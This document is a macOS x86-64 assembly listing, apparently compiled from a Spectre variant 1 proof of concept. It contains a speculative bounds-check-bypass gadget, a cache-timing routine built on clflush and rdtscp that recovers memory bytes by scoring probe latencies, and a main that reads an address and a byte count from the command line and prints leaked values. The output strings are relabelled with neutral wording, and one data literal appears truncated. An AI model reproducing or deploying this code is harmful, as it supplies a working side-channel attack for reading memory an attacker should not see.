	.section	__TEXT,__text,regular,pure_instructions
	.macosx_version_min 10, 13
	.globl	_spectre_function
	.p2align	4, 0x90
_spectre_function:                      ## @spectre_function
	.cfi_startproc
## BB#0:
	pushq	%rbp
Lcfi0:
	.cfi_def_cfa_offset 16
Lcfi1:
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
Lcfi2:
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdi
	movl	_array1_size(%rip), %eax
	movl	%eax, %ecx
	cmpq	%rcx, %rdi
	jae	LBB0_2
## BB#1:
	movq	_array2@GOTPCREL(%rip), %rax
	leaq	_array1(%rip), %rcx
	movq	-8(%rbp), %rdx
	movzbl	(%rcx,%rdx), %esi
	shll	$9, %esi
	movslq	%esi, %rcx
	movzbl	(%rax,%rcx), %esi
	movzbl	_temp(%rip), %edi
	andl	%esi, %edi
	movb	%dil, %r8b
	movb	%r8b, _temp(%rip)
LBB0_2:
	popq	%rbp
	retq
	.cfi_endproc

	.globl	_readMemoryByte
	.p2align	4, 0x90
_readMemoryByte:                        ## @readMemoryByte
	.cfi_startproc
## BB#0:
	pushq	%rbp
Lcfi3:
	.cfi_def_cfa_offset 16
Lcfi4:
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
Lcfi5:
	.cfi_def_cfa_register %rbp
	subq	$160, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movl	$0, -64(%rbp)
	movl	$0, -48(%rbp)
LBB1_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -48(%rbp)         ## imm = 0x100
	jge	LBB1_4
## BB#2:                                ##   in Loop: Header=BB1_1 Depth=1
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-48(%rbp), %rcx
	movl	$0, (%rax,%rcx,4)
## BB#3:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	LBB1_1
LBB1_4:
	movl	$999, -44(%rbp)         ## imm = 0x3E7
LBB1_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_7 Depth 2
                                        ##     Child Loop BB1_11 Depth 2
                                        ##       Child Loop BB1_13 Depth 3
                                        ##     Child Loop BB1_19 Depth 2
                                        ##     Child Loop BB1_26 Depth 2
	cmpl	$0, -44(%rbp)
	jle	LBB1_42
## BB#6:                                ##   in Loop: Header=BB1_5 Depth=1
	movb	$0, %al
	callq	_kdebug_signpost
	movl	$0, -48(%rbp)
	movl	%eax, -112(%rbp)        ## 4-byte Spill
LBB1_7:                                 ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         ## imm = 0x100
	jge	LBB1_10
## BB#8:                                ##   in Loop: Header=BB1_7 Depth=2
	movq	_array2@GOTPCREL(%rip), %rax
	movl	-48(%rbp), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rdx
	addq	%rdx, %rax
	clflush	(%rax)
## BB#9:                                ##   in Loop: Header=BB1_7 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	LBB1_7
LBB1_10:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-44(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	movl	%edx, %edx
	movl	%edx, %ecx
	movq	%rcx, -72(%rbp)
	movl	$29, -52(%rbp)
LBB1_11:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_13 Depth 3
	cmpl	$0, -52(%rbp)
	jl	LBB1_18
## BB#12:                               ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -108(%rbp)
LBB1_13:                                ##   Parent Loop BB1_5 Depth=1
                                        ##     Parent Loop BB1_11 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	movl	-108(%rbp), %eax
	cmpl	$100, %eax
	jge	LBB1_16
## BB#14:                               ##   in Loop: Header=BB1_13 Depth=3
	jmp	LBB1_15
LBB1_15:                                ##   in Loop: Header=BB1_13 Depth=3
	movl	-108(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -108(%rbp)
	jmp	LBB1_13
LBB1_16:                                ##   in Loop: Header=BB1_11 Depth=2
	movl	$6, %eax
	movl	-52(%rbp), %ecx
	movl	%eax, -116(%rbp)        ## 4-byte Spill
	movl	%ecx, %eax
	cltd
	movl	-116(%rbp), %ecx        ## 4-byte Reload
	idivl	%ecx
	subl	$1, %edx
	andl	$-65536, %edx           ## imm = 0xFFFF0000
	movslq	%edx, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rsi
	movq	-80(%rbp), %rdi
	shrq	$16, %rdi
	orq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-72(%rbp), %rsi
	movq	-80(%rbp), %rdi
	movq	-24(%rbp), %r8
	xorq	-72(%rbp), %r8
	andq	%r8, %rdi
	xorq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rdi
	callq	_spectre_function
## BB#17:                               ##   in Loop: Header=BB1_11 Depth=2
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	LBB1_11
LBB1_18:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -48(%rbp)
LBB1_19:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         ## imm = 0x100
	jge	LBB1_25
## BB#20:                               ##   in Loop: Header=BB1_19 Depth=2
	leaq	-64(%rbp), %rax
	movq	_array2@GOTPCREL(%rip), %rcx
	imull	$167, -48(%rbp), %edx
	addl	$13, %edx
	andl	$255, %edx
	movl	%edx, -60(%rbp)
	movl	-60(%rbp), %edx
	shll	$9, %edx
	movslq	%edx, %rsi
	addq	%rsi, %rcx
	movq	%rcx, -104(%rbp)
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rcx
	movq	%rax, -128(%rbp)        ## 8-byte Spill
	movq	%rcx, -136(%rbp)        ## 8-byte Spill
	rdtscp
	movq	-136(%rbp), %rsi        ## 8-byte Reload
	movl	%ecx, (%rsi)
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -88(%rbp)
	movq	-104(%rbp), %rax
	movb	(%rax), %dil
	movzbl	%dil, %ecx
	movl	%ecx, -64(%rbp)
	movq	-128(%rbp), %rax        ## 8-byte Reload
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rdx
	movq	%rdx, -144(%rbp)        ## 8-byte Spill
	rdtscp
	movq	-144(%rbp), %r8         ## 8-byte Reload
	movl	%ecx, (%r8)
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-88(%rbp), %rax
	movq	%rax, -96(%rbp)
	cmpq	$80, -96(%rbp)
	ja	LBB1_23
## BB#21:                               ##   in Loop: Header=BB1_19 Depth=2
	leaq	_array1(%rip), %rax
	movl	-60(%rbp), %ecx
	movl	-44(%rbp), %edx
	movq	%rax, -152(%rbp)        ## 8-byte Spill
	movl	%edx, %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	movl	%edx, %edx
	movl	%edx, %esi
	movq	-152(%rbp), %rdi        ## 8-byte Reload
	movzbl	(%rdi,%rsi), %edx
	cmpl	%edx, %ecx
	je	LBB1_23
## BB#22:                               ##   in Loop: Header=BB1_19 Depth=2
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-60(%rbp), %rcx
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	movl	%edx, (%rax,%rcx,4)
LBB1_23:                                ##   in Loop: Header=BB1_19 Depth=2
	jmp	LBB1_24
LBB1_24:                                ##   in Loop: Header=BB1_19 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	LBB1_19
LBB1_25:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$-1, -56(%rbp)
	movl	$-1, -52(%rbp)
	movl	$0, -48(%rbp)
LBB1_26:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         ## imm = 0x100
	jge	LBB1_36
## BB#27:                               ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -52(%rbp)
	jl	LBB1_29
## BB#28:                               ##   in Loop: Header=BB1_26 Depth=2
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-48(%rbp), %rcx
	movl	(%rax,%rcx,4), %edx
	movslq	-52(%rbp), %rcx
	cmpl	(%rax,%rcx,4), %edx
	jl	LBB1_30
LBB1_29:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-52(%rbp), %eax
	movl	%eax, -56(%rbp)
	movl	-48(%rbp), %eax
	movl	%eax, -52(%rbp)
	jmp	LBB1_34
LBB1_30:                                ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -56(%rbp)
	jl	LBB1_32
## BB#31:                               ##   in Loop: Header=BB1_26 Depth=2
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-48(%rbp), %rcx
	movl	(%rax,%rcx,4), %edx
	movslq	-56(%rbp), %rcx
	cmpl	(%rax,%rcx,4), %edx
	jl	LBB1_33
LBB1_32:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-48(%rbp), %eax
	movl	%eax, -56(%rbp)
LBB1_33:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_34
LBB1_34:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_35
LBB1_35:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	LBB1_26
LBB1_36:                                ##   in Loop: Header=BB1_5 Depth=1
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-52(%rbp), %rcx
	movl	(%rax,%rcx,4), %edx
	movslq	-56(%rbp), %rcx
	movl	(%rax,%rcx,4), %esi
	shll	$1, %esi
	addl	$5, %esi
	cmpl	%esi, %edx
	jge	LBB1_39
## BB#37:                               ##   in Loop: Header=BB1_5 Depth=1
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-52(%rbp), %rcx
	cmpl	$2, (%rax,%rcx,4)
	jne	LBB1_40
## BB#38:                               ##   in Loop: Header=BB1_5 Depth=1
	leaq	_readMemoryByte.results(%rip), %rax
	movslq	-56(%rbp), %rcx
	cmpl	$0, (%rax,%rcx,4)
	jne	LBB1_40
LBB1_39:
	jmp	LBB1_42
LBB1_40:                                ##   in Loop: Header=BB1_5 Depth=1
	jmp	LBB1_41
LBB1_41:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	jmp	LBB1_5
LBB1_42:
	leaq	_readMemoryByte.results(%rip), %rax
	movl	-64(%rbp), %ecx
	xorl	_readMemoryByte.results(%rip), %ecx
	movl	%ecx, _readMemoryByte.results(%rip)
	movl	-52(%rbp), %ecx
	movb	%cl, %dl
	movq	-32(%rbp), %rsi
	movb	%dl, (%rsi)
	movslq	-52(%rbp), %rsi
	movl	(%rax,%rsi,4), %ecx
	movq	-40(%rbp), %rsi
	movl	%ecx, (%rsi)
	movl	-56(%rbp), %ecx
	movb	%cl, %dl
	movq	-32(%rbp), %rsi
	movb	%dl, 1(%rsi)
	movslq	-56(%rbp), %rsi
	movl	(%rax,%rsi,4), %ecx
	movq	-40(%rbp), %rax
	movl	%ecx, 4(%rax)
	addq	$160, %rsp
	popq	%rbp
	retq
	.cfi_endproc

	.globl	_main
	.p2align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## BB#0:
	pushq	%rbp
Lcfi6:
	.cfi_def_cfa_offset 16
Lcfi7:
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
Lcfi8:
	.cfi_def_cfa_register %rbp
	subq	$96, %rsp
	leaq	_array1(%rip), %rax
	movq	___stack_chk_guard@GOTPCREL(%rip), %rcx
	movq	(%rcx), %rcx
	movq	%rcx, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	_secret(%rip), %rcx
	subq	%rax, %rcx
	movq	%rcx, -40(%rbp)
	movl	$23, -48(%rbp)
	movl	$0, -44(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	movslq	-44(%rbp), %rax
	cmpq	$131072, %rax           ## imm = 0x20000
	jae	LBB2_4
## BB#2:                                ##   in Loop: Header=BB2_1 Depth=1
	movq	_array2@GOTPCREL(%rip), %rax
	movslq	-44(%rbp), %rcx
	movb	$1, (%rax,%rcx)
## BB#3:                                ##   in Loop: Header=BB2_1 Depth=1
	movl	-44(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -44(%rbp)
	jmp	LBB2_1
LBB2_4:
	cmpl	$3, -24(%rbp)
	jne	LBB2_6
## BB#5:
	leaq	L_.str.1(%rip), %rsi
	leaq	-40(%rbp), %rax
	movq	-32(%rbp), %rcx
	movq	8(%rcx), %rdi
	movq	%rax, %rdx
	movb	$0, %al
	callq	_sscanf
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	leaq	_array1(%rip), %rcx
	movq	-40(%rbp), %rdi
	subq	%rcx, %rdi
	movq	%rdi, -40(%rbp)
	movq	-32(%rbp), %rcx
	movq	16(%rcx), %rdi
	movl	%eax, -56(%rbp)         ## 4-byte Spill
	movb	$0, %al
	callq	_sscanf
	movl	%eax, -60(%rbp)         ## 4-byte Spill
LBB2_6:
	leaq	L_.str.3(%rip), %rdi
	movl	-48(%rbp), %esi
	movb	$0, %al
	callq	_printf
	movl	%eax, -64(%rbp)         ## 4-byte Spill
LBB2_7:                                 ## =>This Inner Loop Header: Depth=1
	movl	-48(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -48(%rbp)
	cmpl	$0, %eax
	jl	LBB2_15
## BB#8:                                ##   in Loop: Header=BB2_7 Depth=1
	leaq	L_.str.4(%rip), %rdi
	movq	-40(%rbp), %rsi
	movb	$0, %al
	callq	_printf
	leaq	-16(%rbp), %rdx
	leaq	-50(%rbp), %rsi
	movq	-40(%rbp), %rdi
	movq	%rdi, %rcx
	addq	$1, %rcx
	movq	%rcx, -40(%rbp)
	movl	%eax, -68(%rbp)         ## 4-byte Spill
	callq	_readMemoryByte
	leaq	L_.str.5(%rip), %rdi
	leaq	L_.str.7(%rip), %rcx
	leaq	L_.str.6(%rip), %rdx
	movl	-16(%rbp), %eax
	movl	-12(%rbp), %r8d
	shll	$1, %r8d
	cmpl	%r8d, %eax
	cmovgeq	%rdx, %rcx
	movq	%rcx, %rsi
	movb	$0, %al
	callq	_printf
	movzbl	-50(%rbp), %esi
	movzbl	-50(%rbp), %r8d
	cmpl	$31, %r8d
	movl	%eax, -72(%rbp)         ## 4-byte Spill
	movl	%esi, -76(%rbp)         ## 4-byte Spill
	jle	LBB2_11
## BB#9:                                ##   in Loop: Header=BB2_7 Depth=1
	movzbl	-50(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_11
## BB#10:                               ##   in Loop: Header=BB2_7 Depth=1
	movzbl	-50(%rbp), %eax
	movl	%eax, -80(%rbp)         ## 4-byte Spill
	jmp	LBB2_12
LBB2_11:                                ##   in Loop: Header=BB2_7 Depth=1
	movl	$63, %eax
	movl	%eax, -80(%rbp)         ## 4-byte Spill
	jmp	LBB2_12
LBB2_12:                                ##   in Loop: Header=BB2_7 Depth=1
	movl	-80(%rbp), %eax         ## 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movl	-16(%rbp), %ecx
	movl	-76(%rbp), %esi         ## 4-byte Reload
	movl	%eax, %edx
	movb	$0, %al
	callq	_printf
	cmpl	$0, -12(%rbp)
	movl	%eax, -84(%rbp)         ## 4-byte Spill
	jle	LBB2_14
## BB#13:                               ##   in Loop: Header=BB2_7 Depth=1
	leaq	L_.str.9(%rip), %rdi
	movzbl	-49(%rbp), %esi
	movl	-12(%rbp), %edx
	movb	$0, %al
	callq	_printf
	movl	%eax, -88(%rbp)         ## 4-byte Spill
LBB2_14:                                ##   in Loop: Header=BB2_7 Depth=1
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	%eax, -92(%rbp)         ## 4-byte Spill
	jmp	LBB2_7
LBB2_15:
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB2_17
## BB#16:
	xorl	%eax, %eax
	addq	$96, %rsp
	popq	%rbp
	retq
LBB2_17:
	callq	___stack_chk_fail
	.cfi_endproc

	.section	__DATA,__data
	.globl	_array1_size            ## @array1_size
	.p2align	2
_array1_size:
	.long	16                      ## 0x10

	.globl	_array1                 ## @array1
	.p2align	4
_array1:
	.asciz	"\001\002\003\004\005\006\007\b\t\n\013\f\r

	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"Fingerprint 0x414141414"

	.section	__DATA,__data
	.globl	_secret                 ## @secret
	.p2align	3
_secret:
	.quad	L_.str

	.globl	_temp                   ## @temp
.zerofill __DATA,__common,_temp,1,0
	.comm	_array2,131072,4        ## @array2
.zerofill __DATA,__bss,_readMemoryByte.results,1024,4 ## @readMemoryByte.results
	.section	__TEXT,__cstring,cstring_literals
L_.str.1:                               ## @.str.1
	.asciz	"%p"

L_.str.2:                               ## @.str.2
	.asciz	"%d"

L_.str.3:                               ## @.str.3
	.asciz	"Reading %d bytes:\n"

L_.str.4:                               ## @.str.4
	.asciz	"Attempting Confirmation %p "

L_.str.5:                               ## @.str.5
	.asciz	"%s: "

L_.str.6:                               ## @.str.6
	.asciz	"Confirmed"

L_.str.7:                               ## @.str.7
	.asciz	"Unconfirmed"

L_.str.8:                               ## @.str.8
	.asciz	"0x%02X=\342\200\231%c\342\200\231 score=%d "

L_.str.9:                               ## @.str.9
	.asciz	"(Alt: 0x%02X score=%d)"

L_.str.10:                              ## @.str.10
	.asciz	"\n"

	.comm	_unused1,64,4           ## @unused1
	.comm	_unused2,64,4           ## @unused2

.subsections_via_symbols
